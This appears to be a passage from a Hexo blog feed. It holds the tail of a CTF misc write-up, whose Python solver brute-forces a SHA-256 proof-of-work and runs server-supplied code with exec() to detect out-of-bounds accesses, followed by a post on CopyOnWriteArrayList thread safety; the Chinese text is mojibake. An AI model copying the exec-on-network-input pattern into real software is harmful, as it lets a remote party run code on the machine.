class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> second_dim:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = NonNegativeIndexList([[None]*(<span class="subst">&#123;second_dim&#125;</span>)]*(<span class="subst">&#123;first_dim&#125;</span>))&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = NonNegativeIndexList([None]*(<span class="subst">&#123;first_dim&#125;</span>))&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> assignment_match:</span><br><span class="line">        var_name = assignment_match.group(<span class="number">1</span>)</span><br><span class="line">        value = assignment_match.group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid C code provided&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    code_lines = <span class="built_in">input</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> code_line <span class="keyword">in</span> code_lines:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(code_line.find(<span class="string">&quot;int&quot;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span>(code_line.find(<span class="string">&quot;[&quot;</span>)!= -<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">exec</span>(c_to_python_syntax(code_line))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">elif</span>(code_line.find(<span class="string">&#x27;=&#x27;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">exec</span>(code_line.replace(<span class="string">&#x27;int &#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">exec</span>(code_line.replace(<span class="string">&#x27;int &#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27;=None&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">exec</span>(code_line) <span class="comment">#TypeError(æœªåˆå§‹åŒ–)   IndexErrorï¼ˆè¶Šç•Œï¼‰   </span></span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span>(e.args[<span class="number">0</span>].find(<span class="string">&#x27;list indices must be integers or slices&#x27;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;noboo&quot;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;boo&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;noboo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ifboo</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    code = patch(<span class="built_in">input</span>) <span class="comment">#è¡¥å…¨ä»£ç </span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prfint</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    input_lists = <span class="built_in">input</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new_code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> input_list <span class="keyword">in</span> input_lists:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(input_list[-<span class="number">1</span>] == <span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">                new_code += input_list+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> new_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ‰€æœ‰å¯èƒ½çš„ XXX å€¼</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span> ** <span class="number">6</span>):</span><br><span class="line">    <span class="comment"># å°† i è½¬æ¢æˆ 16 è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå·¦ä¾§å¡«å…… 0 åˆ° 6 ä½</span></span><br><span class="line">    xxx_hex = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¡ç®—å“ˆå¸Œå€¼</span></span><br><span class="line">    input_str = <span class="built_in">bytes</span>.fromhex(xxx_hex) + salt</span><br><span class="line">    hash_obj = hashlib.sha256(input_str)</span><br><span class="line">    hash_hex = hash_obj.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¦‚æœå“ˆå¸Œå€¼åŒ¹é…ï¼Œåˆ™æ‰“å° XXX å€¼å¹¶é€€å‡ºå¾ªç¯</span></span><br><span class="line">    <span class="keyword">if</span> hash_hex == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found XXX: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(xxx_hex))</span><br><span class="line">        code = xxx_hex</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">s.sendall(code.encode()+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># æ¥æ”¶æ¥è‡ªæœåŠ¡å™¨çš„æ•°æ®ï¼ˆè®¾å®šæ¥æ”¶æ•°æ®çš„æœ€å¤§å­—èŠ‚æ•°ä¸º1024ï¼‰</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;TIMETIMETIME:::::&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        data = s.recv(<span class="number">2048</span>)</span><br><span class="line">        <span class="built_in">input</span> = data.decode() <span class="comment">#Your answer (safeb/unknown):</span></span><br><span class="line">        input_code = prfint(<span class="built_in">input</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">        </span><br><span class="line">        boo = ifboo(input_code.replace(<span class="string">&#x27;[ &#x27;</span>,<span class="string">&#x27;[&#x27;</span>).replace(<span class="string">&#x27; ]&#x27;</span>,<span class="string">&#x27;]&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span>(boo==<span class="string">&#x27;boo&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;oob&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;oob\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(boo==<span class="string">&#x27;noboo&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;safe&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;safe\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(boo==<span class="string">&#x27;unknown&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;unknown\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;oob&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;oob\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        data = s.recv(<span class="number">2048</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">        <span class="comment"># å‘é€ç”¨æˆ·è¾“å…¥çš„æ•°æ®åˆ°æœåŠ¡å™¨</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># å…³é—­å¥—æ¥å­—</span></span><br><span class="line">    s.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç½‘ä¸Šéƒ½æ˜¯è½¬æˆlarkè¯­æ³•ï¼Œæˆ‘æ˜¯è½¬æˆäº†pythonè¯­æ³•ï¼Œç„¶åé‡è½½äº†åˆ—è¡¨ï¼Œè®©ä»–å¦‚æœindex&lt;0äº†ï¼Œå°±è§¦å‘å¼‚å¸¸ï¼Œæ»¡è¶³cè¯­è¨€çš„è¯­æ³•ï¼Œç„¶åæ ¹æ®ä¸åŒçš„å¼‚å¸¸ä¿¡æ¯å»åˆ¤æ–­ç»“æœ</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ezBean&quot;&gt;&lt;a href=&quot;#ezBean&quot; class=&quot;headerlink&quot; title=&quot;ezBean&quot;&gt;&lt;/a&gt;ezBean&lt;/h2&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="misc" scheme="http://example.com/tags/misc/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CopyOnWriteArrayListè§£æ</title>
    <link href="http://example.com/2023/04/19/CopyOnWriteArrayList%E8%A7%A3%E6%9E%90/"/>
    <id>http://example.com/2023/04/19/CopyOnWriteArrayList%E8%A7%A3%E6%9E%90/</id>
    <published>2023-04-19T12:40:14.000Z</published>
    <updated>2023-08-27T13:00:06.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸¤ä¸ªæœˆä¸çŸ¥é“å¹²å˜›ï¼Œå­¦å·¥å…·åˆä¸æƒ³å­¦ï¼Œå°±å¼€å§‹ç ”ç©¶tomcatçš„æºç ã€‚<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”Ÿå‘½å‘¨æœŸç›‘å¬å™¨ä¿å­˜åœ¨ä¸€ä¸ªçº¿ç¨‹å®‰å…¨çš„CopyOnWriteArrayListä¸­</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> List&lt;LifecycleListener&gt; lifecycleListeners = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addLifecycleListener</span><span class="params">(LifecycleListener listener)</span> &#123;</span><br><span class="line">    lifecycleListeners.add(listener);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> LifecycleListener[] findLifecycleListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> lifecycleListeners.toArray(<span class="keyword">new</span> <span class="title class_">LifecycleListener</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeLifecycleListener</span><span class="params">(LifecycleListener listener)</span> &#123;</span><br><span class="line">    lifecycleListeners.remove(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¥½å¥‡ä¸ºä»€ä¹ˆCopyOnWriteArrayListå¯ä»¥å®ç°çº¿ç¨‹å®‰å…¨ï¼Œæœ¬ç¯‡å°±æµ…æä¸€ä¸‹ä¸ºä»€ä¹ˆä»–å¯ä»¥å®ç°çº¿ç¨‹å®‰å…¨</p><h2 id="æ™®é€šArrayList"><a href="#æ™®é€šArrayList" class="headerlink" title="æ™®é€šArrayList"></a>æ™®é€šArrayList</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">list.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line"></span><br><span class="line"><span class="comment">//æˆ‘å½“å‰æ­£åœ¨è¿­ä»£é›†åˆï¼ˆè¿™é‡Œæ¨¡æ‹Ÿå¹¶å‘ä¸­è¯»å–æŸä¸€listçš„åœºæ™¯ï¼‰</span></span><br><span class="line"><span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line"></span><br><span class="line">System.err.println(iter.next());</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.err.println(Arrays.toString(list.toArray()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ç¨‹åºå¦‚æœåœ¨å•çº¿ç¨‹æ‰§è¡Œæ˜¯æ²¡ä»€ä¹ˆé—®é¢˜çš„ï¼Œä½†æ˜¯å¦‚æœåˆ°äº†å¤šçº¿ç¨‹ï¼Œé‚£ä¹ˆå°±ä¼šå› ä¸ºaddï¼ˆå†™æ“ä½œï¼‰å’Œnextï¼ˆè¯»æ“ä½œï¼‰åŒæ—¶è¿›è¡Œï¼Œè€Œå¼•å‘å¼‚å¸¸<br>ä¸‹é¢çš„ä»£ç å°±æ˜¯ä¼šæŠ›å‡ºå¼‚å¸¸çš„ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">list.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å­˜æ”¾10ä¸ªçº¿ç¨‹çš„çº¿ç¨‹æ± </span></span><br><span class="line"><span class="type">ExecutorService</span> <span class="variable">service</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰§è¡Œ10ä¸ªä»»åŠ¡(æˆ‘å½“å‰æ­£åœ¨è¿­ä»£é›†åˆï¼ˆè¿™é‡Œæ¨¡æ‹Ÿå¹¶å‘ä¸­è¯»å–æŸä¸€listçš„åœºæ™¯ï¼‰)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">service.execute(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">System.err.println(iter.next());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰§è¡Œ10ä¸ªä»»åŠ¡</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">service.execute(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">list.add(<span class="string">&quot;121&quot;</span>);<span class="comment">// æ·»åŠ æ•°æ®</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.err.println(Arrays.toString(list.toArray()));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="next"><a href="#next" class="headerlink" title="next"></a>next</h3><p>å¦‚ä¸‹æ˜¯ArrayListçš„next()ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">    checkForComodification();</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">    Object[] elementData = ArrayList.<span class="built_in">this</span>.elementData;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= elementData.length)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    cursor = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (E) elementData[lastRet = i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨next()ä¸­<br><code>Object[] elementData = ArrayList.this.elementData;</code><br>è§¦å‘äº†elementDataçš„è¯»å–æ“ä½œ</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>å¦‚ä¸‹æ˜¯ArrayListçš„add()ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    checkForComodification();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">        ArrayList.<span class="built_in">this</span>.add(i, e);</span><br><span class="line">        cursor = i + <span class="number">1</span>;</span><br><span class="line">        lastRet = -<span class="number">1</span>;</span><br><span class="line">        expectedModCount = modCount;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    rangeCheckForAdd(index);</span><br><span class="line"></span><br><span class="line">    ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">    System.arraycopy(elementData, index, elementData, index + <span class="number">1</span>,</span><br><span class="line">                        size - index);</span><br><span class="line">    elementData[index] = element;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨add()ä¸­<br><code>ArrayList.this.add(i, e);</code><br>è§¦å‘äº†elementDataçš„å†™æ“ä½œ</p><h2 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h2><h3 id="add-1"><a href="#add-1" class="headerlink" title="add"></a>add</h3><p>é‚£ä¹ˆçœ‹çœ‹CopyOnWriteArrayListæ˜¯å¦‚ä½•å®ç°addçš„<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">        Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">        newElements[len] = e;</span><br><span class="line">        setArray(newElements);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°addæ“ä½œè¿›è¡Œäº†åŠ é”ï¼Œå¹¶ä¸”ç”Ÿæˆäº†ä¸€ä¸ªæ–°çš„æ•°ç»„ï¼ŒæŠŠæ—§çš„åˆ—è¡¨å¤åˆ¶åˆ°æ–°åˆ—è¡¨ä¸­<br>åœ¨è¿™è§¦å‘äº†elementsçš„è¯»å–å†™å…¥æ“ä½œ</p><h2 id="next-1"><a href="#next-1" class="headerlink" title="next"></a>next</h2><p>å†æ¥çœ‹çœ‹å¦‚ä½•è¿›è¡Œnextæ“ä½œçš„<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">COWIterator</span>&lt;E&gt;(getArray(), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">COWIterator</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ListIterator</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">COWIterator</span><span class="params">(Object[] elements, <span class="type">int</span> initialCursor)</span> &#123;</span><br><span class="line">        cursor = initialCursor;</span><br><span class="line">        snapshot = elements;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (! hasNext())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        <span class="keyword">return</span> (E) snapshot[cursor++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°CopyOnWriteArrayListçš„nextæ“ä½œå¹¶æ²¡æœ‰åƒArraylistä¸­çš„nextä¸€æ ·è¿›è¡Œå¯¹elementsçš„ç›´æ¥æ“ä½œï¼Œè€Œæ˜¯ç”¨äº†ä¸€ä¸ªå‰¯æœ¬ï¼Œå¯¹å‰¯æœ¬è¿›è¡Œæ“ä½œ<br>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä½ ä½¿ç”¨äº†<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Iterator&lt;String&gt; iter = list.iterator();</span><br></pre></td></tr></table></figure><br>è·å–è¿­ä»£å¯¹è±¡ï¼Œåé¢å¦‚æœå†ä½¿ç”¨addæ“ä½œä¹Ÿåªä¼šè¾“å‡ºåŸå…ˆçš„æ•°ç»„çš„å€¼ï¼Œä¸‹é¢æ˜¯ç¤ºä¾‹ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CopyOnWriteArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        list.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line">        list.add(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">            System.err.println(iter.next());</span><br><span class="line">        &#125;</span><br><span class="line">        System.err.println(Arrays.toString(list.toArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 